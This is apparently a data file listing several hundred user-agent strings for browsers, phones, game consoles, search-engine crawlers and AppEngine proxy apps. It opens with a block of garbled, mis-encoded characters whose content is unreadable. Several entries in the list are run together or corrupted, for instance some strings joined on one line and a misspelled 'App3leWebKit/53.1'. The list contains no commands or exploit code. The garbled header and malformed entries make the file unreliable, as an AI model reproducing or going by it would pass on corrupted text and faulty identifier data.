&√´ÍÄ†Á≥°Èº±Èã•ÏåìÀ†Ëå∞Ïè†ÍÄìÏã°ÍÄø«°Êåê„£†‡¨ê„£•·¨∞œ•ÍÄ¥„£°·¨êœ•ÊÑ∞À†Êå†„£†‡¨†„£•·¨†Ôø•»∞„≥¢Èº°«•Ïà∞Î´•&√´ÍÄ†„É°Èº±Èã•ÏåìÀ†Ëå∞Ïè†ÍÄìÏã°ÍÄø«°Êåê„ì†‡¨ê„ì•·¨∞œ•ÍÄ¥„ì°·¨êœ•ÊÑ∞À†Êå†„ì†‡¨†„ì•·¨†Ôø•»∞ÔÉ¢Èº†À•Ïà∞
&√´ÍÄ†Óì°Èº∞Èã•ÏåìÀ†Ëå∞Ïè†ÍÄìÏã°ÍÄø«°Êåê„É†‡¨ê„É•·¨∞œ•ÍÄ¥„É°·¨êœ•ÊÑ∞À†Êå†„É†‡¨†„É•·¨†Ôø•»∞Íì¢Èº†œ•Ïà∞‚£•‰¨∞√¢ÍÄ†√£Ëå†”•Ëå∞√¢ÍÄ†√£Ëå†”•Ëå∞√¢ÍÄ†√£Ëå†”•Ëå∞√¢ÍÄ†√£Ëå†‚£•‰¨êÁÉ¢ÈøÄÊì•Èº∞√•Ìå∞œ•ÍÉ†Â£°Èº∞«•Ìå∞œ•ÍÅÄ‰≥°Èº∞À•Ìå∞œ•ÍÄ†‰É°Èº∞œ•Ìå∞√•Ë¥†”•Ë¥∞«•ÍÄÄ‡≥°ÍÄê
 √´ÍÄ∞œ°ÍÄêÏÉ°Èº∞Èá•Ëå£Íè†ÍÄ±Ìì°‡¨∞Ìì•·¨∞œ•ÍÄ±Ëè°ÍÄ°À°Ëå∞«†ÊåêÌì†‡¨êÎè•ÓÄ†Ìì£·¨ê«•ÍÄ±‡≥°‰¨ê«¢Ëå∞À†Ëå∞√†Èå∞·É•‡¨∞·ì•·¨∞
\n√´ÍÄ†”°È¨∞œ•Ëà∞·≥†‡¨∞Ìü•\e√´ÍÄêÏì°Èº±Èá•Ïå£«†Ëå∞‰è†ÍÄ¢Ïá°ÍÄøÀ°Êå†Ê≥†‡¨¨Ê≥•·¨ºËè•ÍÄ†À°ÍÄ≤œ°Êà∞«†ÊåêÊ≥†‡¨úÍè•ÓÄæ
\e√´ÍÄêÊá°ÍÄø·è£Ëå≤Èª¢Ëå∏Èá¢Ïå£Ïè†ÍÄ£Ïá°ÍÄøÀ°Êå†Ê£†‡¨¨Ê£•·¨ºœ•ÍÄ≤œ°ÍÄ°À°Êå†Ëã†ÍÄ±œ°Êà∞Ê£†·¨¨À•Ëå∞Ëè†ÍÄ∞«°ÊåêÊ£†‡¨ú√•ÍÄ∞Íè£‰åæÊ£¢·¨ú«•ÍÄ°·ì°‰¨ê«¢Ëà†œ†Ëà∞√†Èå†
\n√´ÍÄ∞«°Ëå∞œ¢ÍÄÄÏ´°\r√´ÍÄ∞œ°ÍÄêÎó°ÍÄ¥Ïè£ÍÄ∫”°ÍÄ°·ì°‰¨Ä√¢Ëà†œ†Ëà∞√†Ëåê‚ì•·¨†Îó•ÍÄ¥Ïè£ÍÄ∫À°ÍÄ°·ì°‰¨ê«¢Ëà†œ†Ëà∞√†ÈçÄ‚É•·¨∞œ•ÍÄÄÁØ°\n√´ÍÄ∞«°Ëå∞”¢ÍÄÄ√°ÍÄêœ£ÍÄ†‰∑°\n‚ì´·¨†Îó•ÍÄ¥Ïè£ÍÄ∫À°ÍÄ°·ì°‰¨Ä√¢Ëà†œ†Ëà∞√†Èå∞‚É•·¨†œ•ÍÄÄÀ°ÍÄê·á°\v‚ì´·¨∞«•Ëå∞‚ì¢‡¨∞√•ÍÄÄ·ì£ÈºëËó•\v√´ÍÄ∞‚É°‡¨∞‚É•·¨∞√•ÂåÄÏã£
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
Mozilla/5.0 (PLAYSTATION 3; 3.55)
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
wii libnup/1.0
Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
PSP (PlayStation Portable); 2.00
Bunjalloo/0.7.6(Nintendo DS;U;en)
Doris/1.15 [en] (Symbian)
BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100
Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01
Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)
Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0
Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)
Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/
Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma)
Mozilla/4.0 (compatible: FDSE robot)
findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET 
Opera/9.20 (Windows NT 6.0; U; en)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)
Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)
Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0
Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01
Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+
Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6
Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02
Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4
Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1
Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10
Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36
Opera/8.5 (X11; i686 Linux; U; ru, en_US)
Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25
Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50
Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
